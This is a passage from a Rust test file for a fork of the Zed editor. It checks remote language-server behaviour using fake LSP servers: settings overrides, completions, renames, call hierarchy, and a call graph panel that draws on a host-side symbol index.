                          "path": "~/.cargo/bin/rust-analyzer"
                        }
                      }
                    }
                  }"#
        }),
    )
    .await;

    let worktree_id = project
        .update(cx, |project, cx| {
            project.languages().add(rust_lang());
            project.find_or_create_worktree("/code/project1", true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());

    let buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    server_cx.read(|cx| {
        let worktree_id = headless
            .read(cx)
            .worktree_store
            .read(cx)
            .worktrees()
            .next()
            .unwrap()
            .read(cx)
            .id();
        assert_eq!(
            AllLanguageSettings::get(
                Some(SettingsLocation {
                    worktree_id,
                    path: rel_path("src/lib.rs")
                }),
                cx
            )
            .language(None, Some(&"Rust".into()), cx)
            .language_servers,
            [ConfiguredLanguageServer::new("override-rust-analyzer")]
        )
    });

    cx.read(|cx| {
        assert_eq!(
            LanguageSettings::for_buffer(buffer.read(cx), cx).language_servers,
            [ConfiguredLanguageServer::new("override-rust-analyzer")]
        )
    });
}

#[gpui::test]
async fn test_remote_lsp(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    cx.update(ProjectLaunchApprovals::approve_everything_for_tests);
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    fs.insert_tree(
        path!("/code/project1/.zed"),
        json!({
            "settings.json": r#"
          {
            "languages": {"Rust":{"language_servers":["rust-analyzer", "fake-analyzer"]}},
            "lsp": {
              "rust-analyzer": {
                "binary": {
                  "path": "~/.cargo/bin/rust-analyzer"
                }
              },
              "fake-analyzer": {
               "binary": {
                "path": "~/.cargo/bin/rust-analyzer"
               }
              }
            }
          }"#
        }),
    )
    .await;

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: (LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..Default::default()
            })
            .into(),
            ..Default::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                capabilities: lsp::ServerCapabilities {
                    completion_provider: Some(lsp::CompletionOptions::default()),
                    rename_provider: Some(lsp::OneOf::Left(true)),
                    ..lsp::ServerCapabilities::default()
                },
                ..FakeLspAdapter::default()
            },
        );
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "fake-analyzer",
                capabilities: lsp::ServerCapabilities {
                    completion_provider: Some(lsp::CompletionOptions::default()),
                    rename_provider: Some(lsp::OneOf::Left(true)),
                    ..lsp::ServerCapabilities::default()
                },
                ..FakeLspAdapter::default()
            },
        )
    });

    let mut fake_lsp = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            lsp::ServerCapabilities {
                completion_provider: Some(lsp::CompletionOptions::default()),
                rename_provider: Some(lsp::OneOf::Left(true)),
                ..lsp::ServerCapabilities::default()
            },
            None,
        )
    });

    let mut fake_second_lsp = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "fake-analyzer",
                capabilities: lsp::ServerCapabilities {
                    completion_provider: Some(lsp::CompletionOptions::default()),
                    rename_provider: Some(lsp::OneOf::Left(true)),
                    ..lsp::ServerCapabilities::default()
                },
                ..FakeLspAdapter::default()
            },
        );
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("fake-analyzer".into()),
            lsp::ServerCapabilities {
                completion_provider: Some(lsp::CompletionOptions::default()),
                rename_provider: Some(lsp::OneOf::Left(true)),
                ..lsp::ServerCapabilities::default()
            },
            None,
        )
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.languages().add(rust_lang());
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());

    // Wait for the settings to synchronize
    cx.run_until_parked();

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let fake_lsp = fake_lsp.next().await.unwrap();
    let fake_second_lsp = fake_second_lsp.next().await.unwrap();

    cx.read(|cx| {
        assert_eq!(
            LanguageSettings::for_buffer(buffer.read(cx), cx).language_servers,
            [
                ConfiguredLanguageServer::new("rust-analyzer"),
                ConfiguredLanguageServer::new("fake-analyzer"),
            ]
        )
    });

    let buffer_id = cx.read(|cx| {
        let buffer = buffer.read(cx);
        assert_eq!(buffer.language().unwrap().name(), "Rust");
        buffer.remote_id()
    });

    server_cx.read(|cx| {
        let buffer = headless
            .read(cx)
            .buffer_store
            .read(cx)
            .get(buffer_id)
            .unwrap();

        assert_eq!(buffer.read(cx).language().unwrap().name(), "Rust");
    });

    server_cx.read(|cx| {
        let lsp_store = headless.read(cx).lsp_store.read(cx);
        assert_eq!(lsp_store.as_local().unwrap().language_servers.len(), 2);
    });

    fake_lsp.set_request_handler::<lsp::request::Completion, _, _>(|_, _| async move {
        Ok(Some(CompletionResponse::Array(vec![lsp::CompletionItem {
            label: "boop".to_string(),
            ..Default::default()
        }])))
    });

    fake_second_lsp.set_request_handler::<lsp::request::Completion, _, _>(|_, _| async move {
        Ok(Some(CompletionResponse::Array(vec![lsp::CompletionItem {
            label: "beep".to_string(),
            ..Default::default()
        }])))
    });

    let result = project
        .update(cx, |project, cx| {
            project.completions(
                &buffer,
                0,
                CompletionContext {
                    trigger_kind: CompletionTriggerKind::INVOKED,
                    trigger_character: None,
                },
                cx,
            )
        })
        .await
        .unwrap();

    assert_eq!(
        result
            .into_iter()
            .flat_map(|response| response.completions)
            .map(|c| c.label.text)
            .collect::<Vec<_>>(),
        vec!["boop".to_string(), "beep".to_string()]
    );

    fake_lsp.set_request_handler::<lsp::request::Rename, _, _>(|_, _| async move {
        Ok(Some(lsp::WorkspaceEdit {
            changes: Some(
                [(
                    lsp::Uri::from_file_path(path!("/code/project1/src/lib.rs")).unwrap(),
                    vec![lsp::TextEdit::new(
                        lsp::Range::new(lsp::Position::new(0, 3), lsp::Position::new(0, 6)),
                        "two".to_string(),
                    )],
                )]
                .into_iter()
                .collect(),
            ),
            ..Default::default()
        }))
    });

    project
        .update(cx, |project, cx| {
            project.perform_rename(buffer.clone(), 3, "two".to_string(), None, cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();
    buffer.update(cx, |buffer, _| {
        assert_eq!(buffer.text(), "fn two() -> usize { 1 }")
    })
}

#[gpui::test]
async fn test_remote_completion_resolve_edit_ranges(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code/project"),
        json!({ "lib.rs": "test(value1, value2)" }),
    )
    .await;
    let (project, headless) = init_test(&fs, cx, server_cx).await;
    let capabilities = lsp::ServerCapabilities {
        completion_provider: Some(lsp::CompletionOptions {
            resolve_provider: Some(true),
            ..lsp::CompletionOptions::default()
        }),
        ..lsp::ServerCapabilities::default()
    };
    project.update(cx, |project, _| {
        project.languages().add(rust_lang());
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                capabilities: capabilities.clone(),
                ..FakeLspAdapter::default()
            },
        );
    });
    let mut fake_servers = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName(SharedString::from("rust-analyzer")),
            capabilities,
            Some(Box::new(|fake_server| {
                fake_server.set_request_handler::<lsp::request::Completion, _, _>(
                    |params, _| async move {
                        assert_eq!(
                            params.text_document_position.position,
                            lsp::Position::new(0, 13)
                        );
                        Ok(Some(CompletionResponse::Array(vec![lsp::CompletionItem {
                            label: "value2=".to_string(),
                            ..lsp::CompletionItem::default()
                        }])))
                    },
                );
            })),
        )
    });
    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project"), true, cx)
        })
        .await
        .expect("worktree should open")
        .0
        .read_with(cx, |worktree, _| worktree.id());
    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("lib.rs")), cx)
        })
        .await
        .expect("buffer should open with LSP");
    let fake_server = fake_servers.next().await.expect("LSP should start");
    cx.run_until_parked();

    let explicit_replace_range =
        lsp::Range::new(lsp::Position::new(0, 12), lsp::Position::new(0, 19));
    let explicit_insert_range =
        lsp::Range::new(lsp::Position::new(0, 12), lsp::Position::new(0, 13));
    let lsp_store = project.read_with(cx, |project, _| project.lsp_store());
    for (resolved_edit, expected_insert_range, expected_replace_range, expected_text) in [
        (None, Some(13..13), 13..19, "value2="),
        (
            Some(lsp::CompletionTextEdit::Edit(lsp::TextEdit {
                range: explicit_replace_range,
                new_text: " value2=".to_string(),
            })),
            None,
            12..19,
            " value2=",
        ),
        (
            Some(lsp::CompletionTextEdit::InsertAndReplace(
                lsp::InsertReplaceEdit {
                    insert: explicit_insert_range,
                    replace: explicit_replace_range,
                    new_text: " value2=".to_string(),
                },
            )),
            Some(12..13),
            12..19,
            " value2=",
        ),
    ] {
        fake_server.set_request_handler::<lsp::request::ResolveCompletionItem, _, _>(
            move |mut item, _| {
                let resolved_edit = resolved_edit.clone();
                async move {
                    assert_eq!(item.label, "value2=");
                    item.documentation = Some(lsp::Documentation::String("resolved".to_string()));
                    item.text_edit = resolved_edit;
                    Ok(item)
                }
            },
        );
        let completions = project
            .update(cx, |project, cx| {
                project.completions(
                    &buffer,
                    13,
                    CompletionContext {
                        trigger_kind: CompletionTriggerKind::INVOKED,
                        trigger_character: None,
                    },
                    cx,
                )
            })
            .await
            .expect("completions should load")
            .into_iter()
            .flat_map(|response| response.completions)
            .collect::<Vec<_>>();
        assert_eq!(completions.len(), 1);
        buffer.read_with(cx, |buffer, _| {
            let completion = completions.first().expect("completion should exist");
            let CompletionSource::Lsp { insert_range, .. } = &completion.source else {
                panic!("expected LSP completion");
            };
            assert_eq!(
                *insert_range,
                Some(buffer.anchor_before(13)..buffer.anchor_after(13))
            );
            assert_eq!(
                completion.replace_range,
                buffer.anchor_before(13)..buffer.anchor_after(19)
            );
        });
        let completions = Rc::new(RefCell::new(completions.into_boxed_slice()));
        let did_resolve = lsp_store
            .update(cx, |lsp_store, cx| {
                lsp_store.resolve_completions(buffer.clone(), vec![0], completions.clone(), cx)
            })
            .await
            .expect("completion should resolve");
        assert!(did_resolve);
        buffer.read_with(cx, |buffer, _| {
            let completions = completions.borrow();
            let completion = completions.first().expect("completion should exist");
            let CompletionSource::Lsp {
                insert_range,
                resolved,
                lsp_completion,
                ..
            } = &completion.source
            else {
                panic!("expected LSP completion");
            };
            assert!(*resolved);
            assert_eq!(
                lsp_completion.documentation,
                Some(lsp::Documentation::String("resolved".to_string()))
            );
            assert_eq!(
                *insert_range,
                expected_insert_range
                    .map(|range| buffer.anchor_before(range.start)..buffer.anchor_after(range.end))
            );
            assert_eq!(
                completion.replace_range,
                buffer.anchor_before(expected_replace_range.start)
                    ..buffer.anchor_after(expected_replace_range.end)
            );
            assert_eq!(completion.new_text, expected_text);
        });
    }
}

#[gpui::test]
async fn test_remote_call_hierarchy(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    // The project's settings name a language server binary, which the fork launches only
    // once the user approves it (ADR-F50), as in `test_remote_lsp`.
    cx.update(ProjectLaunchApprovals::approve_everything_for_tests);
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": "fn main() { helper(); }\nfn helper() {}\n"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    fs.insert_tree(
        path!("/code/project1/.zed"),
        json!({
            "settings.json": r#"
          {
            "languages": {"Rust":{"language_servers":["rust-analyzer"]}},
            "lsp": {
              "rust-analyzer": {
                "binary": {
                  "path": "~/.cargo/bin/rust-analyzer"
                }
              }
            }
          }"#
        }),
    )
    .await;

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: Arc::new(LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..LanguageMatcher::default()
            }),
            ..LanguageConfig::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                capabilities: lsp::ServerCapabilities {
                    call_hierarchy_provider: Some(lsp::CallHierarchyServerCapability::Simple(true)),
                    ..lsp::ServerCapabilities::default()
                },
                ..FakeLspAdapter::default()
            },
        )
    });

    let mut fake_lsp = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            lsp::ServerCapabilities {
                call_hierarchy_provider: Some(lsp::CallHierarchyServerCapability::Simple(true)),
                ..lsp::ServerCapabilities::default()
            },
            None,
        )
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.languages().add(rust_lang());
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());

    cx.run_until_parked();

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    let fake_lsp = fake_lsp.next().await.unwrap();
    let test_uri = lsp::Uri::from_file_path(path!("/code/project1/src/lib.rs")).unwrap();

    fake_lsp.set_request_handler::<lsp::request::CallHierarchyPrepare, _, _>({
        let uri = test_uri.clone();
        move |_, _| {
            let uri = uri.clone();
            async move {
                Ok(Some(vec![lsp::CallHierarchyItem {
                    name: "main".into(),
                    kind: lsp::SymbolKind::FUNCTION,
                    tags: None,
                    detail: Some("fn main()".into()),
                    uri,
                    range: lsp::Range::new(lsp::Position::new(0, 0), lsp::Position::new(0, 21)),
                    selection_range: lsp::Range::new(
                        lsp::Position::new(0, 3),
                        lsp::Position::new(0, 7),
                    ),
                    data: None,
                }]))
            }
        }
    });

    fake_lsp.set_request_handler::<lsp::request::CallHierarchyOutgoingCalls, _, _>({
        move |_, _| {
            let uri = test_uri.clone();
            async move {
                Ok(Some(vec![lsp::CallHierarchyOutgoingCall {
                    to: lsp::CallHierarchyItem {
                        name: "helper".into(),
                        kind: lsp::SymbolKind::FUNCTION,
                        tags: None,
                        detail: Some("fn helper()".into()),
                        uri,
                        range: lsp::Range::new(lsp::Position::new(1, 0), lsp::Position::new(1, 13)),
                        selection_range: lsp::Range::new(
                            lsp::Position::new(1, 3),
                            lsp::Position::new(1, 9),
                        ),
                        data: None,
                    },
                    from_ranges: Vec::new(),
                }]))
            }
        }
    });

    let items = project
        .update(cx, |project, cx| {
            project.prepare_call_hierarchy(&buffer, PointUtf16::new(0, 3), cx)
        })
        .await
        .unwrap()
        .unwrap();
    assert_eq!(items.len(), 1);
    assert_eq!(items[0].name, "main");
    assert_eq!(items[0].buffer, buffer);
    items[0].buffer.read_with(cx, |item_buffer, _| {
        assert_eq!(
            items[0].selection_range.to_point(item_buffer),
            Point::new(0, 3)..Point::new(0, 7)
        );
    });

    let outgoing_calls = project
        .update(cx, |project, cx| {
            project.outgoing_calls(items[0].clone(), cx)
        })
        .await
        .unwrap()
        .unwrap();
    assert_eq!(outgoing_calls.len(), 1);
    assert_eq!(outgoing_calls[0].to.name, "helper");
    assert_eq!(outgoing_calls[0].to.buffer, buffer);
    outgoing_calls[0].to.buffer.read_with(cx, |item_buffer, _| {
        assert_eq!(
            outgoing_calls[0].to.selection_range.to_point(item_buffer),
            Point::new(1, 3)..Point::new(1, 9)
        );
    });
}

// Added by zed-jp-enhance with the call graph panel: its tree keeps only weak
// handles to buffers and opens them again by path when a row is expanded.
#[gpui::test]
async fn test_remote_call_graph_expands_released_files(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    cx.update(ProjectLaunchApprovals::approve_everything_for_tests);
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": "fn main() { helper(); }\nfn helper() {}\n",
                    "other.rs": "fn other_caller() { helper(); }\n"
                }
            },
            "external": {
                "ext.rs": "fn outside() { helper(); }\n"
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    fs.insert_tree(
        path!("/code/project1/.zed"),
        json!({
            "settings.json": r#"
          {
            "languages": {"Rust":{"language_servers":["rust-analyzer"]}},
            "lsp": {
              "rust-analyzer": {
                "binary": {
                  "path": "~/.cargo/bin/rust-analyzer"
                }
              }
            }
          }"#
        }),
    )
    .await;

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: Arc::new(LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..LanguageMatcher::default()
            }),
            ..LanguageConfig::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                capabilities: lsp::ServerCapabilities {
                    call_hierarchy_provider: Some(lsp::CallHierarchyServerCapability::Simple(true)),
                    ..lsp::ServerCapabilities::default()
                },
                ..FakeLspAdapter::default()
            },
        )
    });

    let mut fake_lsp = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            lsp::ServerCapabilities {
                call_hierarchy_provider: Some(lsp::CallHierarchyServerCapability::Simple(true)),
                ..lsp::ServerCapabilities::default()
            },
            None,
        )
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.languages().add(rust_lang());
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());

    cx.run_until_parked();

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    let fake_lsp = fake_lsp.next().await.unwrap();
    let lib_uri = lsp::Uri::from_file_path(path!("/code/project1/src/lib.rs")).unwrap();
    let other_uri = lsp::Uri::from_file_path(path!("/code/project1/src/other.rs")).unwrap();
    let ext_uri = lsp::Uri::from_file_path(path!("/code/external/ext.rs")).unwrap();
    let item = |name: &str, uri: &lsp::Uri, end: u32| lsp::CallHierarchyItem {
        name: name.into(),
        kind: lsp::SymbolKind::FUNCTION,
        tags: None,
        detail: None,
        uri: uri.clone(),
        range: lsp::Range::new(lsp::Position::new(0, 0), lsp::Position::new(0, end)),
        selection_range: lsp::Range::new(
            lsp::Position::new(0, 3),
            lsp::Position::new(0, 3 + name.len() as u32),
        ),
        data: None,
    };

    fake_lsp.set_request_handler::<lsp::request::CallHierarchyPrepare, _, _>({
        let mut helper = item("helper", &lib_uri, 14);
        helper.range = lsp::Range::new(lsp::Position::new(1, 0), lsp::Position::new(1, 14));
        helper.selection_range =
            lsp::Range::new(lsp::Position::new(1, 3), lsp::Position::new(1, 9));
        move |_, _| {
            let helper = helper.clone();
            async move { Ok(Some(vec![helper])) }
        }
    });
    let asked_about = Arc::new(std::sync::Mutex::new(Vec::<(String, lsp::Uri)>::new()));
    fake_lsp.set_request_handler::<lsp::request::CallHierarchyIncomingCalls, _, _>({
        let callers = vec![
            item("other_caller", &other_uri, 31),
            item("outside", &ext_uri, 26),
        ];
        let asked_about = asked_about.clone();
        move |params, _| {
            let callers = callers.clone();
            let asked_about = asked_about.clone();
            async move {
                asked_about
                    .lock()
                    .unwrap()
                    .push((params.item.name.clone(), params.item.uri.clone()));
                if params.item.name == "helper" {
                    Ok(Some(
                        callers
                            .into_iter()
                            .map(|from| lsp::CallHierarchyIncomingCall {
                                from,
                                from_ranges: Vec::new(),
                            })
                            .collect(),
                    ))
                } else {
                    Ok(Some(Vec::new()))
                }
            }
        }
    });

    let position = buffer.read_with(cx, |buffer, _| buffer.anchor_before(PointUtf16::new(1, 4)));
    let root = cx
        .update(|cx| {
            call_graph_panel::prepare_root(
                &project,
                buffer.clone(),
                position,
                call_graph_panel::SourceFilter::All,
                cx,
            )
        })
        .await
        .unwrap();
    let call_graph_panel::RootOutcome::Found(root) = root else {
        panic!("expected a root, got {root:?}");
    };
    assert_eq!(root.name, "helper");

    let callers = cx
        .update(|cx| {
            call_graph_panel::fetch_children(
                &project,
                &root,
                call_graph_panel::CallDirection::Incoming,
                call_graph_panel::FetchOptions::default(),
                cx,
            )
        })
        .await
        .unwrap()
        .symbols;
    let caller = |name: &str| {
        callers
            .iter()
            .find(|caller| caller.name == name)
            .cloned()
            .unwrap_or_else(|| panic!("no caller named {name}"))
    };
    let other_caller = caller("other_caller");
    let outside = caller("outside");
    drop(callers);

    let count_worktrees = |cx: &mut TestAppContext, server_cx: &mut TestAppContext| {
        cx.run_until_parked();
        server_cx.run_until_parked();
        cx.run_until_parked();
        let client = project.read_with(cx, |project, cx| project.worktrees(cx).count());
        let server = headless.read_with(server_cx, |headless, cx| {
            headless.worktree_store.read(cx).worktrees().count()
        });
        (client, server)
    };
    let is_open = |file_name: &str, cx: &mut TestAppContext| {
        project.read_with(cx, |project, cx| {
            project.opened_buffers(cx).iter().any(|buffer| {
                buffer
                    .read(cx)
                    .file()
                    .is_some_and(|file| file.file_name(cx) == file_name)
            })
        })
    };

    let after_first_answer = count_worktrees(cx, server_cx);
    assert!(
        !is_open("other.rs", cx),
        "a caller inside the project is not kept open by the tree"
    );
    for _ in 0..3 {
        for symbol in [&other_caller, &outside] {
            let grandchildren = cx
                .update(|cx| {
                    call_graph_panel::fetch_children(
                        &project,
                        symbol,
                        call_graph_panel::CallDirection::Incoming,
                        call_graph_panel::FetchOptions::default(),
                        cx,
                    )
                })
                .await
                .unwrap();
            assert!(grandchildren.symbols.is_empty());
        }
        assert!(!is_open("other.rs", cx));
        assert_eq!(
            count_worktrees(cx, server_cx),
            after_first_answer,
            "expanding again does not leave worktrees behind on either side"
        );
    }

    // A file outside the project's folders is not asked about at all over
    // SSH, reopened or not: the client finds no language server for its
    // invisible worktree. That is why only its worktrees are counted above.
    let asked_about = asked_about.lock().unwrap().clone();
    let mut expected = vec![("helper".to_string(), lib_uri.clone())];
    for _ in 0..3 {
        expected.push(("other_caller".to_string(), other_uri.clone()));
    }
    assert_eq!(
        asked_about, expected,
        "every expansion of a file inside the project reaches the language server on the host"
    );

    let site = call_graph_panel::resolve_location(
        &project,
        other_caller.jump_target(0),
        &mut cx.to_async(),
    )
    .await
    .unwrap();
    site.buffer.read_with(cx, |buffer, _| {
        assert_eq!(buffer.text(), "fn other_caller() { helper(); }\n");
        assert_eq!(
            site.range.to_point(buffer),
            Point::new(0, 3)..Point::new(0, 15)
        );
    });
}

// Added by zed-jp-enhance with the call graph panel's symbol index (ADR-F68):
// the index answers on the host, including for a function in a file outside
// the project, which the language server cannot be asked about over SSH.
#[gpui::test]
async fn test_remote_call_graph_uses_the_symbol_index(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    cx.executor().allow_parking();
    server_cx.executor().allow_parking();
    cx.update(ProjectLaunchApprovals::approve_everything_for_tests);
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "main.c": "int helper(void) { return 1; }\nint main(void) { return outside(); }\n",
                "other.c": "int other_caller(void) { return helper(); }\n",
            },
            "external": {
                "ext.c": "int outside(void) { return helper(); }\n"
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;
    let index_root = tempfile::tempdir().unwrap();
    let server_store =
        headless.read_with(server_cx, |headless, _| headless.symbol_index_store.clone());
    server_store.update(server_cx, |store, cx| {
        store.set_index_root_for_tests(Some(index_root.path().to_path_buf()), cx)
    });

    fs.insert_tree(
        path!("/code/project1/.zed"),
        json!({
            "settings.json": r#"
          {
            "languages": {"C":{"language_servers":["clangd"]}},
            "lsp": {
              "clangd": {
                "binary": {
                  "path": "~/.local/bin/clangd"
                }
              }
            }
          }"#
        }),
    )
    .await;

    let c_config = LanguageConfig {
        name: "C".into(),
        matcher: Arc::new(LanguageMatcher {
            path_suffixes: vec!["c".into()],
            ..LanguageMatcher::default()
        }),
        ..LanguageConfig::default()
    };
    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(c_config.clone());
        project.languages().register_fake_lsp_adapter(
            "C",
            FakeLspAdapter {
                name: "clangd",
                capabilities: lsp::ServerCapabilities {
                    call_hierarchy_provider: Some(lsp::CallHierarchyServerCapability::Simple(true)),
                    ..lsp::ServerCapabilities::default()
                },
                ..FakeLspAdapter::default()
            },
        )
    });
    let mut fake_lsp = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("clangd".into()),
            lsp::ServerCapabilities {
                call_hierarchy_provider: Some(lsp::CallHierarchyServerCapability::Simple(true)),
                ..lsp::ServerCapabilities::default()
            },
            None,
        )
    });
    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());
    let client_store = project.read_with(cx, |project, _| project.symbol_index_store().clone());
    let mut ready = false;
    for _ in 0..1000 {
        server_cx
            .executor()
            .advance_clock(Duration::from_millis(100));
        server_cx.run_until_parked();
        cx.run_until_parked();
        ready = matches!(
            client_store.read_with(cx, |store, _| store.status(worktree_id)),
            project::symbol_index_store::SymbolIndexStatus::Ready { .. }
        );
        if ready {
            break;
        }
        std::thread::sleep(Duration::from_millis(10));
    }
    assert!(ready, "the client hears that the host's index is ready");

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("main.c")), cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();
    let position = buffer.read_with(cx, |buffer, _| buffer.anchor_before(Point::new(0, 5)));

    // Name matches only: the root and its callers come from the host's index.
    let root = cx
        .update(|cx| {
            call_graph_panel::prepare_root(
                &project,
                buffer.clone(),
                position,
                call_graph_panel::SourceFilter::NameMatch,
                cx,
            )
        })
        .await
        .unwrap();
    let call_graph_panel::RootOutcome::Found(root) = root else {
        panic!("expected a root, got {root:?}");
    };
    assert_eq!(root.name, "helper");
    assert_eq!(root.origin, call_graph_panel::CallOrigin::NameMatch);
    let name_matches = call_graph_panel::FetchOptions {
        sources: call_graph_panel::SourceFilter::NameMatch,
        ..call_graph_panel::FetchOptions::default()
    };
    let callers = cx
        .update(|cx| {
            call_graph_panel::fetch_children(
                &project,
                &root,
                call_graph_panel::CallDirection::Incoming,
                name_matches.clone(),
                cx,
            )
        })
        .await
        .unwrap()
        .symbols;
    assert_eq!(
        callers
            .iter()
            .map(|caller| (caller.name.to_string(), caller.origin))
            .collect::<Vec<_>>(),
        vec![(
            "other_caller".to_string(),
            call_graph_panel::CallOrigin::NameMatch
        )]
    );
    let site =
        call_graph_panel::resolve_location(&project, callers[0].jump_target(0), &mut cx.to_async())
            .await
            .unwrap();
    site.buffer.read_with(cx, |buffer, _| {
        assert_eq!(
            buffer.text(),
            "int other_caller(void) { return helper(); }\n"
        );
        assert_eq!(
            site.range.to_point(buffer),
            Point::new(0, 32)..Point::new(0, 38),
            "a name match opens its file only to jump to it"
        );
    });

    // The language server lists a caller in a file outside the project.
    let fake_lsp = fake_lsp.next().await.unwrap();
    let main_uri = lsp::Uri::from_file_path(path!("/code/project1/main.c")).unwrap();
    let ext_uri = lsp::Uri::from_file_path(path!("/code/external/ext.c")).unwrap();
    let item = |name: &str, uri: &lsp::Uri| lsp::CallHierarchyItem {
        name: name.into(),
        kind: lsp::SymbolKind::FUNCTION,
        tags: None,
        detail: None,
        uri: uri.clone(),
        range: lsp::Range::new(lsp::Position::new(0, 0), lsp::Position::new(0, 30)),
        selection_range: lsp::Range::new(
            lsp::Position::new(0, 4),
            lsp::Position::new(0, 4 + name.len() as u32),
        ),
        data: None,
    };
    fake_lsp.set_request_handler::<lsp::request::CallHierarchyPrepare, _, _>({
        let helper = item("helper", &main_uri);
        move |_, _| {
            let helper = helper.clone();
            async move { Ok(Some(vec![helper])) }
        }
    });
    fake_lsp.set_request_handler::<lsp::request::CallHierarchyIncomingCalls, _, _>({
        let outside = item("outside", &ext_uri);
        move |params, _| {
            let outside = outside.clone();
            async move {
                if params.item.name == "helper" {
                    Ok(Some(vec![lsp::CallHierarchyIncomingCall {
                        from: outside,
                        from_ranges: Vec::new(),
                    }]))
                } else {
                    Ok(Some(Vec::new()))
                }
            }
        }
    });

    let root = cx
        .update(|cx| {
            call_graph_panel::prepare_root(
                &project,
                buffer.clone(),
                position,
                call_graph_panel::SourceFilter::All,
                cx,
            )
        })
        .await
        .unwrap();
    let call_graph_panel::RootOutcome::Found(root) = root else {
        panic!("expected a root, got {root:?}");
    };
    assert_eq!(root.origin, call_graph_panel::CallOrigin::LanguageServer);
    let callers = cx
        .update(|cx| {
            call_graph_panel::fetch_children(
                &project,
                &root,
                call_graph_panel::CallDirection::Incoming,
                call_graph_panel::FetchOptions::default(),
                cx,
            )
        })
        .await
        .unwrap()
        .symbols;
    assert_eq!(
        callers
            .iter()
            .map(|caller| (caller.name.to_string(), caller.origin))
            .collect::<Vec<_>>(),
        vec![
            (
                "outside".to_string(),
                call_graph_panel::CallOrigin::LanguageServer
            ),
            (
                "other_caller".to_string(),
